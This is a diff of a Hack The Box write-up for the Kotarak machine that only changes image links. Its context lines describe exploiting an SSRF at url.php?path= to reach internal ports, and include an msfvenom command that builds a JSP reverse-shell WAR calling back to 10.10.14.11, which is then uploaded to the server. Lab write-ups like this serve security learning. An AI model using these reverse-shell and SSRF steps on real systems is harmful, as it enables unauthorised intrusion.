@@ -53,7 +53,7 @@ PORT      STATE SERVICE
 
 On the web page on port 60000 we can allegedly browse the web:
 
-![Web page port 60000](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-1.png)
+![Web page port 60000](kotarak_web-1.png)
 
 When entering a test string and submitting it, it forwards us to _/url.php?path=teststring_.
 This looks like a **Server-Side Request Forgery (SSRF)** attack, where it could be possible to access parts of the server that should normally not be accessible.
@@ -108,11 +108,11 @@ Now request every single one as before with port 60000:
 
 The service on **port 320** could be interesting when finding credentials:
 
-![SSRF on port 320](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-2.png)
+![SSRF on port 320](kotarak_web-2.png)
 
 The service on **port 888** provides some files that could be useful:
 
-![SSRF on port 888](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-3.png)
+![SSRF on port 888](kotarak_web-3.png)
 
 To look up the files, they need to be appended on the URL:
 ```markdown
@@ -138,7 +138,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.11 LPORT=80 -f war > rce.w
 
 Uploading it to the server:
 
-![Uploading WAR file](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-4.png)
+![Uploading WAR file](kotarak_web-4.png)
 
 Now we start a listener on port 80 on our local client and start the _/rce_ application:
 ```markdown
